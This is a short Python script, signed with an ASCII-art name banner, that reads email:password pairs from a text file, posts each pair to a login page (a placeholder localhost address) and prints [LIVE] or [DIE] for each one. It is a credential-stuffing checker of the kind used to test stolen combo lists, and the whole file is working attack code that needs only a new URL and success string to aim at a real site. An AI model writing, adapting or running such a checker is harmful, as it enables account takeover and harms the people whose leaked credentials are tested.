#    _                         _____                          _     _ 
#   | |                       |  __ \                        | |   (_)
#   | |    _   _  __ _ _ __   | |  | | _____   _____  ___ ___| |__  _ 
#   | |   | | | |/ _` | '_ \  | |  | |/ _ \ \ / / _ \/ __/ __| '_ \| |
#   | |___| |_| | (_| | | | | | |__| |  __/\ V /  __/ (_| (__| | | | |
#   |______\__,_|\__,_|_| |_| |_____/ \___| \_/ \___|\___\___|_| |_|_|
#                                                                     
#                                                                     

import requests

live = 'live msg'
mylist = open('mylist1.txt' , 'r').readlines()
mylist = [line.replace('\n' , '') for line in mylist]

for line in mylist:
	splitfields = line.split(':')
	postdata = {'email' : splitfields[0], 'password' : splitfields[1]}
	check = requests.post('http://localhost/auth/dologin.php', data=postdata).text
	if live in check:
		print('[LIVE] {} {}'.format(splitfields[0],splitfields[1]))
	else:
		print('[DIE] {} {}'.format(splitfields[0],splitfields[1]))

print('Finished.')